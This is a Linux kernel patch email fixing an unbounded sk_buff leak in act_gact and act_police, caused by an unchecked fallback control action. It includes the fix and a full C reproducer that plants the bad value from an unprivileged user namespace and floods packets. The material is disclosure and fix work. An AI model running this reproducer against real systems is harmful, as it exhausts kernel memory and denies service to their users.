Received: from mail-pj1-f41.google.com (mail-pj1-f41.google.com [209.85.216.41])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 764F643B499
	for <stable@vger.kernel.org>; Thu,  6 Aug 2026 10:13:01 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.41
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786011185; cv=none; b=a1Ot+d2XOaIhWRinq28YLAZ6SUZgMW/3QVt0EMo9/BewMuW84NBtyp/fAYZ91OoNKQ/5a3iUOpcX1pGmFFbU8NNCgkOXg2DdLh0aoeseDsTYYn3Z+6oSeqBkwhp6XVv78ztBqVo2rgMKF4kaen4wVRwMRzv4aVX/I4XnThQ2K4Q=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786011185; c=relaxed/simple;
	bh=C0TmWAVPdCO+WuT6sSfroboKQfc2AQIJJB8pGY0D5pE=;
	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=G5rHxPXB1o79g1rHzWdY+lvHeEe7M8mILVHlLFyzNo6UC/EQRvXKZId4ujRuS5gF1kE2tqrT5Z9IWUGJSBc6yMfkWdxkksvU2JLfEH2qlV0t4E5vKJW7CSXHhu7i154MZ3GrmzTgZDUwimiBbqXxAJX9S8kjZxEzc66DRA3HcZg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=THagvs3j; arc=none smtp.client-ip=209.85.216.41
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="THagvs3j"
Received: by mail-pj1-f41.google.com with SMTP id 98e67ed59e1d1-38deea72eebso1717148a91.1
        for <stable@vger.kernel.org>; Thu, 06 Aug 2026 03:13:01 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1786011181; x=1786615981; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=b6ez6ZvRtUdCx7lN8GeKcHMndJzIeraNpmB3tK89ACA=;
        b=THagvs3jLAyJT3FZ8WCQ8ZFhda7eCfMpYtqsxPU7g5SkhsAZLHtXHGagqyzbYwByer
         A+il+4f5sQv+L5zFLvYmcnFJEOOAf+ROgoUAilYg6gXjIQDBZrPSoFoYDwKzOV67vnrQ
         e1Z0YVDArPm4/KHfzA7ltbfopj58fzoXPhqrRWCj6VhsefP45Kd1h6NWlqwu+PwbcJ9d
         dvr10bLFiU3RXqMa9EUaMNRFpMR9LePNGhS04CFuitOJqnTfboBtj4nV/edB1ho+5kq5
         XMObvAoNWlDyrbg10UpIaETrlPf0Rlp7rjrQ7DapaKEZNRmPyfSG5RGkulJKGPH8MjOM
         ExwQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786011181; x=1786615981;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=b6ez6ZvRtUdCx7lN8GeKcHMndJzIeraNpmB3tK89ACA=;
        b=f/qeeGyKzB9pPQthGfGdMxyXT26IhemwvFfKzzcgS9aNxj0B6m49VrMI6IyIJuo8wx
         Ji8znL1ttPJ+tFVeCt17Db/VHyqrMf1P/AO9ShAKir1SJPWFEcBHVCw66FjltVxs6Sbo
         WGzJTiDnUQZ9YB96juWDxO/ue3iy4EzJuTeUdgzLVsjxggbbLbSYk1NdBppGozwtVNq9
         ntoaYjwTB137cKm0aUCZPeOwjJWO3EGNN5jHtBfQ7mUmp2+fu+wxKFUm+z12s3gllLed
         kegLu50mSJEDosIRivvsjWepTtZHktvUmuTfYVho6q/4YicSkomJnMTNLYV4O9EiMPhs
         s7eg==
X-Forwarded-Encrypted: i=1; AHgh+RqYkp2q02+nXUUmgkAV0IteSDdg7ANQehoGoOb4JPwofKJVnq1o4CgE3hdsBd33NU3L42A1uaw=@vger.kernel.org
X-Gm-Message-State: AOJu0YzNaPjRbhHb9Bl9Tac1rGlxSJozwqPOkoG5BMN3LHC5eZNWRfAg
	Ns0zfK8JIXytgyCG+bgj54ULqM0/c1mIpLDfOTnp/9Z2G1DP/giu+ayG
X-Gm-Gg: AR+sD12zfoVRywWxaUCJCHqgmqjmYs79nq3EbTaAUem60Wt6pyvOU3uIujQ7cJ0lmNs
	Mkfm2kBKxmtiS8ObvcylXJ2dl9Br+F+h4tLSYI1MDmLJVud32Tn+d9X+8S4JewechVoj6051mSW
	FHLzs0Z7zMINSeX1Y3is/6wFuGfipJou/R3dbjsdCdDoaO8Wh8VvWQwkHpMvd/cxqMzJfkqOpEr
	Jn7Zit0Yy6AuAS0dCDKpL0sBIMTb1NFF4N0AzXQvTHn29uomuQzOne10LQJVuaJXXNum5fxE8fg
	GL5wbK9szHuNl9IkCQ8ieIjT6YgCc38EXcjbJrDnQHxkyYY/tc0jElsVUQfFj8GyuDvK3NhpBrP
	KrQdhT5M4uwJXJkPQerBWE92QRb9V51j8tR9v6naqPAQzOYO0hSZbjPPeXvMXiTbwY/hIrbwW7O
	7jeBCC4Naau3IexaXS0Mp2Qb6NuC0nqm3sONW/3GC93leLRNFOKNzp0Z9y19/S/WfO28KJxhgED
	YojCeyjeUKh6i0/ioDczBp1f81qKy/v2Xt7ZIJ0/iQwYaYq2w==
X-Received: by 2002:a17:90b:4c86:b0:37f:c22a:c188 with SMTP id 98e67ed59e1d1-3903c5590dfmr12229959a91.4.1786011180514;
        Thu, 06 Aug 2026 03:13:00 -0700 (PDT)
Received: from BOOK-P74QMIQ7E8.localdomain ([220.73.18.179])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39085de9f6asm1235229a91.7.2026.08.06.03.12.57
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 06 Aug 2026 03:12:59 -0700 (PDT)
From: Hyunjung Ko <hj351016@gmail.com>
To: "David S . Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	Simon Horman <horms@kernel.org>,
	Jamal Hadi Salim <jhs@mojatatu.com>,
	Jiri Pirko <jiri@resnulli.us>
Cc: netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	Hyunjung Ko <hj351016@gmail.com>,
	stable@vger.kernel.org
Subject: [PATCH net v2] net/sched: act_gact, act_police: range check the fallback control action
Date: Thu,  6 Aug 2026 19:12:52 +0900
Message-Id: <20260806101252.809593-1-hj351016@gmail.com>
X-Mailer: git-send-email 2.34.1
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

tcf_action_check_ctrlact() range checks the primary control action:

	if (!opcode)
		ret = action > TC_ACT_VALUE_MAX ? -EINVAL : 0;

TC_ACT_VALUE_MAX is TC_ACT_TRAP, so kernel-internal verdicts above it
cannot be set that way. But act_gact and act_police each carry a second,
independent control action supplied by user space that never reaches that
helper - TCA_GACT_PROB.paction and TCA_POLICE_RESULT. Both only reject
TC_ACT_GOTO_CHAIN, so any other value is stored verbatim and returned
verbatim from the action.

In particular user space can store TC_ACT_CONSUMED, which is
TC_ACT_VALUE_MAX + 1 and is deliberately not part of the UAPI value
range. That verdict tells every caller the action took ownership of the
skb, so nobody frees it: sch_handle_ingress(), sch_handle_egress() and
tcf_qevent_handle() all deliberately skip the free for it. The result is
one leaked sk_buff plus its data buffer per packet traversing the filter,
unbounded, for all traffic on the chain including kernel-generated
packets.

Both are trivially deterministic. act_gact clamps tcfg_pval to >= 1, so
with pval = 1 gact_determ() returns the fallback for every packet.
act_police has no mandatory rate, so rate = 0 leaves tcfp_mtu = ~0 and
tcf_police_mtu_check() always passes.

TC_ACT_CONSUMED was added by commit 720f22fed81b ("net: sched: refactor
reinsert action"), after both goto-chain guards were written:
commit 9469f375ab09 ("net/sched: act_gact: disallow 'goto chain' on
fallback control action") and
commit c08f5ed5d625 ("net/sched: act_police: disallow 'goto chain' on
fallback control action"). Neither guard was widened when the new
verdict appeared.

Factor the existing range test out of tcf_action_check_ctrlact() as
tcf_action_valid() and apply it to both fallbacks. The helper cannot call
tcf_action_check_ctrlact() directly because that also allocates a
goto_chain, which is exactly what these two sites must not do.

Reproduced on v7.2-rc6: kmemleak reports one leaked 232-byte
skbuff_head_cache object plus its 704-byte data buffer per packet. With
this patch both configurations are rejected with -EINVAL and kmemleak
reports none.

Fixes: 720f22fed81b ("net: sched: refactor reinsert action")
Cc: stable@vger.kernel.org # v5.3+
Assisted-by: Anthropic-Claude-Code:Claude-Opus-5
Signed-off-by: Hyunjung Ko <hj351016@gmail.com>
---
 include/net/act_api.h  | 19 +++++++++++++++++++
 net/sched/act_gact.c   |  5 +++++
 net/sched/act_police.c |  6 ++++++
 3 files changed, 30 insertions(+)

v2:
 - add Assisted-by: tag
 - explain below why no tdc case is possible; C reproducer offered
 - no functional change
v1: https://lore.kernel.org/netdev/20260805095527.204088-1-hj351016@gmail.com/

No tdc selftest accompanies this one, unlike the act_ct fix: tdc drives
tc(8), and iproute2 only parses symbolic control-action names, so the bad
value cannot be expressed at all.

  $ tc actions add action gact drop random determ ok 2
  RTNETLINK answers: Operation not permitted   <- parsed fine
  $ tc actions add action gact drop random determ 9 2
  Bad action type 9                            <- rejected by iproute2

The fallback therefore has to be planted over raw netlink. Self-contained
reproducer below; on an unpatched kernel it prints

  gact    fallback = 9 (TC_ACT_CONSUMED): ACCEPTED BY THE KERNEL
          skbuff_head_cache 140 -> 364 (+224) after 200 packets

  police  fallback = 9 (TC_ACT_CONSUMED): ACCEPTED BY THE KERNEL
          skbuff_head_cache 364 -> 560 (+196) after 200 packets

and with this patch applied both filters are refused with -EINVAL
"invalid fallback control action" and nothing leaks.

8<--------------------------------------------------
// SPDX-License-Identifier: GPL-2.0
/*
 * act_gact / act_police accept an out-of-range fallback control action.
 *
 * tc(8) cannot express this: iproute2 only parses symbolic action names, so
 * the value has to be planted over raw netlink. Build and run as an
 * unprivileged user (needs unprivileged userns) or as root:
 *
 *	gcc -O2 -o repro repro.c && ./repro
 *
 * Needs CONFIG_NET_ACT_GACT + CONFIG_GACT_PROB, CONFIG_NET_ACT_POLICE.
 * Add CONFIG_DEBUG_KMEMLEAK and boot with kmemleak=on to see the leaked
 * objects; /proc/slabinfo alone is enough to see the growth.
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/rtnetlink.h>
#include <net/if.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <unistd.h>

#define TC_H_CLSACT	0xFFFFFFF1U
#define TC_H_MIN_INGRESS 0xFFF2U
#define TCA_KIND_	1
#define TCA_OPTIONS_	2
#define TCA_ACT_KIND_	1
#define TCA_ACT_OPTIONS_ 2
#define TCA_MATCHALL_ACT_ 2
#define TCA_GACT_PARMS_	2
#define TCA_GACT_PROB_	3
#define TCA_POLICE_TBF_	1
#define TCA_POLICE_RESULT_ 5
#define PGACT_DETERM_	2
#define BAD_ACTION	9		/* TC_ACT_CONSUMED, kernel-internal */

struct tc_gen { __u32 index, capab; int action, refcnt, bindcnt; };
struct tc_gact_p_ { __u16 ptype, pval; int paction; };
struct tc_ratespec_ { __u8 cell_log, linklayer; __u16 overhead;
		      __s16 cell_align; __u16 mpu; __u32 rate; };
struct tc_police_ { __u32 index; int action; __u32 limit, burst, mtu;
		    struct tc_ratespec_ rate, peakrate;
		    int refcnt, bindcnt; __u32 capab; };

static int nl;
static char extack[256];

struct req { struct nlmsghdr n; char buf[2048]; };

static void *tail(struct nlmsghdr *n) { return (char *)n + NLMSG_ALIGN(n->nlmsg_len); }

static void addattr(struct nlmsghdr *n, int type, const void *d, int len)
{
	struct rtattr *rta = tail(n);

	rta->rta_type = type;
	rta->rta_len = RTA_LENGTH(len);
	if (len)
		memcpy(RTA_DATA(rta), d, len);
	n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static void addstr(struct nlmsghdr *n, int t, const char *s)
{
	addattr(n, t, s, strlen(s) + 1);
}

static struct rtattr *nest(struct nlmsghdr *n, int t)
{
	struct rtattr *r = tail(n);

	addattr(n, t | NLA_F_NESTED, NULL, 0);
	return r;
}

static void unnest(struct nlmsghdr *n, struct rtattr *r)
{
	r->rta_len = (char *)tail(n) - (char *)r;
}

static int talk(struct nlmsghdr *n)
{
	char rbuf[8192];
	struct iovec iov = { n, n->nlmsg_len };
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	struct msghdr m = { &sa, sizeof(sa), &iov, 1, NULL, 0, 0 };
	static __u32 seq = 1;
	struct nlmsghdr *h;
	ssize_t len;

	n->nlmsg_seq = ++seq;
	n->nlmsg_flags |= NLM_F_ACK;
	extack[0] = '\0';
	if (sendmsg(nl, &m, 0) < 0)
		return -errno;
	iov.iov_base = rbuf; iov.iov_len = sizeof(rbuf);
	len = recvmsg(nl, &m, 0);
	if (len < 0)
		return -errno;
	for (h = (void *)rbuf; NLMSG_OK(h, (unsigned)len); h = NLMSG_NEXT(h, len)) {
		struct nlmsgerr *e = NLMSG_DATA(h);
		struct rtattr *rta;
		int hlen = sizeof(*e), rl;

		if (h->nlmsg_type != NLMSG_ERROR)
			continue;
		if (e->error && (h->nlmsg_flags & NLM_F_ACK_TLVS)) {
			if (!(h->nlmsg_flags & NLM_F_CAPPED))
				hlen += e->msg.nlmsg_len - NLMSG_HDRLEN;
			rta = (void *)((char *)e + hlen);
			rl = h->nlmsg_len - NLMSG_HDRLEN - hlen;
			for (; RTA_OK(rta, rl); rta = RTA_NEXT(rta, rl))
				if ((rta->rta_type & NLA_TYPE_MASK) == 1)
					snprintf(extack, sizeof(extack), "%.*s",
						 (int)RTA_PAYLOAD(rta),
						 (char *)RTA_DATA(rta));
		}
		return e->error;
	}
	return 0;
}

static void init(struct req *r, int type, int flags, size_t hdr)
{
	memset(r, 0, sizeof(*r));
	r->n.nlmsg_len = NLMSG_LENGTH(hdr);
	r->n.nlmsg_type = type;
	r->n.nlmsg_flags = NLM_F_REQUEST | flags;
}

static int veth_add(void)
{
	struct req r;
	struct rtattr *li, *data, *peer;
	struct ifinfomsg ph = {};

	init(&r, RTM_NEWLINK, NLM_F_CREATE | NLM_F_EXCL, sizeof(struct ifinfomsg));
	addstr(&r.n, IFLA_IFNAME, "veth0");
	li = nest(&r.n, IFLA_LINKINFO);
	addstr(&r.n, IFLA_INFO_KIND, "veth");
	data = nest(&r.n, IFLA_INFO_DATA);
	peer = nest(&r.n, 1 /* VETH_INFO_PEER */);
	memcpy(tail(&r.n), &ph, sizeof(ph));
	r.n.nlmsg_len = NLMSG_ALIGN(r.n.nlmsg_len) + NLMSG_ALIGN(sizeof(ph));
	addstr(&r.n, IFLA_IFNAME, "veth1");
	unnest(&r.n, peer); unnest(&r.n, data); unnest(&r.n, li);
	return talk(&r.n);
}

static int link_up(const char *dev)
{
	struct req r;
	struct ifinfomsg *i;

	init(&r, RTM_NEWLINK, 0, sizeof(*i));
	i = NLMSG_DATA(&r.n);
	i->ifi_family = AF_UNSPEC;
	i->ifi_index = if_nametoindex(dev);
	i->ifi_flags = i->ifi_change = IFF_UP;
	return talk(&r.n);
}

static int clsact_add(void)
{
	struct req r;
	struct tcmsg *t;

	init(&r, RTM_NEWQDISC, NLM_F_CREATE | NLM_F_EXCL, sizeof(*t));
	t = NLMSG_DATA(&r.n);
	t->tcm_family = AF_UNSPEC;
	t->tcm_ifindex = if_nametoindex("veth0");
	t->tcm_parent = TC_H_CLSACT;
	t->tcm_handle = 0xFFFF0000U;
	addstr(&r.n, TCA_KIND_, "clsact");
	return talk(&r.n);
}

/* matchall + gact|police whose *fallback* control action is @fallback */
static int filter_add(const char *kind, int fallback)
{
	struct req r;
	struct tcmsg *t;
	struct rtattr *o, *acts, *a1, *ao;
	struct tc_gen parm = {};

	init(&r, RTM_NEWTFILTER, NLM_F_CREATE | NLM_F_EXCL, sizeof(*t));
	t = NLMSG_DATA(&r.n);
	t->tcm_family = AF_UNSPEC;
	t->tcm_ifindex = if_nametoindex("veth0");
	t->tcm_parent = 0xFFFF0000U | TC_H_MIN_INGRESS;
	t->tcm_info = (1u << 16) | htons(ETH_P_ALL);
	addstr(&r.n, TCA_KIND_, "matchall");
	o = nest(&r.n, TCA_OPTIONS_);
	acts = nest(&r.n, TCA_MATCHALL_ACT_);
	a1 = nest(&r.n, 1);
	addstr(&r.n, TCA_ACT_KIND_, kind);
	ao = nest(&r.n, TCA_ACT_OPTIONS_);
	if (!strcmp(kind, "gact")) {
		/* ptype = PGACT_DETERM, pval = 1 -> gact_determ() returns the
		 * fallback for every packet (tcfg_pval is clamped to >= 1). */
		struct tc_gact_p_ prob = { PGACT_DETERM_, 1, fallback };

		addattr(&r.n, TCA_GACT_PARMS_, &parm, sizeof(parm));
		addattr(&r.n, TCA_GACT_PROB_, &prob, sizeof(prob));
	} else {
		/* rate = 0 leaves tcfp_mtu = ~0, so tcf_police_mtu_check() is
		 * always true and tcf_police_act() returns tcfp_result. */
		struct tc_police_ pol = {};

		addattr(&r.n, TCA_POLICE_TBF_, &pol, sizeof(pol));
		addattr(&r.n, TCA_POLICE_RESULT_, &fallback, sizeof(fallback));
	}
	unnest(&r.n, ao); unnest(&r.n, a1); unnest(&r.n, acts); unnest(&r.n, o);
	return talk(&r.n);
}

static int filter_flush(void)
{
	struct req r;
	struct tcmsg *t;

	init(&r, RTM_DELTFILTER, 0, sizeof(*t));
	t = NLMSG_DATA(&r.n);
	t->tcm_family = AF_UNSPEC;
	t->tcm_ifindex = if_nametoindex("veth0");
	t->tcm_parent = 0xFFFF0000U | TC_H_MIN_INGRESS;
	return talk(&r.n);
}

static long skbs(void)
{
	char l[512];
	FILE *f = fopen("/proc/slabinfo", "r");
	long a = -1;

	if (!f)
		return -1;
	while (fgets(l, sizeof(l), f)) {
		char n[128]; long act, num;

		if (sscanf(l, "%127s %ld %ld", n, &act, &num) == 3 &&
		    !strcmp(n, "skbuff_head_cache")) { a = act; break; }
	}
	fclose(f);
	return a;
}

static void inject(int n)
{
	unsigned char f[54] = { [0 ... 5] = 0xaa, [6 ... 11] = 0xbb };
	struct sockaddr_ll s = { .sll_family = AF_PACKET, .sll_halen = 6 };
	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)), i;

	f[12] = 0x86; f[13] = 0xdd;	/* IPv6 */
	f[14] = 0x60; f[20] = 59; f[21] = 64;	/* nexthdr NONE, hop limit */
	s.sll_ifindex = if_nametoindex("veth1");
	memset(s.sll_addr, 0xaa, 6);
	if (fd < 0 || bind(fd, (struct sockaddr *)&s, sizeof(s)) < 0)
		return;
	for (i = 0; i < n; i++)
		sendto(fd, f, sizeof(f), MSG_DONTWAIT,
		       (struct sockaddr *)&s, sizeof(s));
	usleep(400000);
	close(fd);
}

static void run(const char *kind)
{
	long before, after;
	int rc;

	filter_flush();
	rc = filter_add(kind, BAD_ACTION);
	printf("\n%-7s fallback = %d (TC_ACT_CONSUMED): %s%s%s\n", kind,
	       BAD_ACTION, rc ? "REJECTED" : "ACCEPTED BY THE KERNEL",
	       rc && extack[0] ? " -- " : "", rc ? extack : "");
	if (rc)
		return;
	before = skbs();
	inject(200);
	after = skbs();
	printf("        skbuff_head_cache %ld -> %ld (%+ld) after 200 packets\n",
	       before, after, after - before);
}

int main(void)
{
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	char b[64];
	int on = 1, fd;
	uid_t uid = getuid();

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) == 0) {
		fd = open("/proc/self/setgroups", O_WRONLY);
		if (fd >= 0) { write(fd, "deny", 4); close(fd); }
		snprintf(b, sizeof(b), "0 %d 1", getgid());
		fd = open("/proc/self/gid_map", O_WRONLY);
		if (fd >= 0) { write(fd, b, strlen(b)); close(fd); }
		snprintf(b, sizeof(b), "0 %d 1", uid);
		fd = open("/proc/self/uid_map", O_WRONLY);
		if (fd >= 0) { write(fd, b, strlen(b)); close(fd); }
	} else if (unshare(CLONE_NEWNET)) {
		perror("unshare"); return 1;
	}

	nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	setsockopt(nl, SOL_NETLINK, 11 /* NETLINK_EXT_ACK */, &on, sizeof(on));
	if (bind(nl, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("bind"); return 1;
	}
	if (veth_add() || link_up("veth0") || link_up("veth1") || clsact_add()) {
		fprintf(stderr, "setup failed\n"); return 1;
	}

	run("gact");
	run("police");
	printf("\nA fixed kernel rejects both with -EINVAL and leaks nothing.\n");
	return 0;
}
-------------------------------------------------->8

Reproducer needs CONFIG_NET_ACT_GACT + CONFIG_GACT_PROB and
CONFIG_NET_ACT_POLICE, plus CONFIG_DEBUG_KMEMLEAK and kmemleak=on to
observe it.

The bad value cannot be set with tc(8) - iproute2 only parses symbolic
action names - so the fallback has to be planted over raw netlink:
TCA_GACT_PROB.paction = 9 with ptype = PGACT_DETERM and pval = 1, or
TCA_POLICE_RESULT = 9 with rate = 0. Attach either to a clsact ingress
chain and every packet leaks its skb.

Before, one sk_buff plus its data buffer per packet:

  kmemleak: 166 new suspected memory leaks
  unreferenced object 0xffff888103baadc0 (size 232):
    kmem_cache_alloc_node_noprof+0x2f1/0x3e0
    __alloc_skb+0xe5/0x860
    alloc_skb_with_frags+0x82/0x750
    sock_alloc_send_pskb+0x658/0x7e0
    packet_sendmsg+0x1833/0x4860
    __x64_sys_sendto+0xe0/0x1c0
    do_syscall_64+0x102/0x5a0

After: both configurations are rejected at netlink time with -EINVAL
and "invalid fallback control action", and kmemleak reports no
unreferenced objects.

For the same reason tdc cannot express the bad configuration, so no
selftest accompanies this patch. A self-contained C reproducer is
available on request.

diff --git a/include/net/act_api.h b/include/net/act_api.h
index 20d9e55f8564..fd03f6319e88 100644
--- a/include/net/act_api.h
+++ b/include/net/act_api.h
@@ -270,6 +270,25 @@ int tcf_action_check_ctrlact(int action, struct tcf_proto *tp,
 struct tcf_chain *tcf_action_set_ctrlact(struct tc_action *a, int action,
 					 struct tcf_chain *newchain);
 
+/* Range check for a control action supplied by user space.
+ *
+ * This is the same test tcf_action_check_ctrlact() applies to the primary
+ * control action, factored out for the *fallback* control actions
+ * (act_gact's TCA_GACT_PROB.paction and act_police's TCA_POLICE_RESULT),
+ * which must not reach tcf_action_check_ctrlact() because they have no
+ * goto_chain to allocate.  Without it, user space can store kernel-internal
+ * verdicts such as TC_ACT_CONSUMED, which is TC_ACT_VALUE_MAX + 1 and is
+ * deliberately not part of the UAPI value range.
+ */
+static inline bool tcf_action_valid(int action)
+{
+	int opcode = TC_ACT_EXT_OPCODE(action);
+
+	if (!opcode)
+		return action <= TC_ACT_VALUE_MAX;
+	return opcode <= TC_ACT_EXT_OPCODE_MAX || action == TC_ACT_UNSPEC;
+}
+
 #ifdef CONFIG_INET
 DECLARE_STATIC_KEY_FALSE(tcf_frag_xmit_count);
 #endif
diff --git a/net/sched/act_gact.c b/net/sched/act_gact.c
index e949280eb800..565860cccba6 100644
--- a/net/sched/act_gact.c
+++ b/net/sched/act_gact.c
@@ -89,6 +89,11 @@ static int tcf_gact_init(struct net *net, struct nlattr *nla,
 		p_parm = nla_data(tb[TCA_GACT_PROB]);
 		if (p_parm->ptype >= MAX_RAND)
 			return -EINVAL;
+		if (!tcf_action_valid(p_parm->paction)) {
+			NL_SET_ERR_MSG(extack,
+				       "invalid fallback control action");
+			return -EINVAL;
+		}
 		if (TC_ACT_EXT_CMP(p_parm->paction, TC_ACT_GOTO_CHAIN)) {
 			NL_SET_ERR_MSG(extack,
 				       "goto chain not allowed on fallback");
diff --git a/net/sched/act_police.c b/net/sched/act_police.c
index b16468a98c55..ce08f6840ef7 100644
--- a/net/sched/act_police.c
+++ b/net/sched/act_police.c
@@ -128,6 +128,12 @@ static int tcf_police_init(struct net *net, struct nlattr *nla,
 
 	if (tb[TCA_POLICE_RESULT]) {
 		tcfp_result = nla_get_u32(tb[TCA_POLICE_RESULT]);
+		if (!tcf_action_valid(tcfp_result)) {
+			NL_SET_ERR_MSG(extack,
+				       "invalid fallback control action");
+			err = -EINVAL;
+			goto failure;
+		}
 		if (TC_ACT_EXT_CMP(tcfp_result, TC_ACT_GOTO_CHAIN)) {
 			NL_SET_ERR_MSG(extack,
 				       "goto chain not allowed on fallback");
--
2.43.0
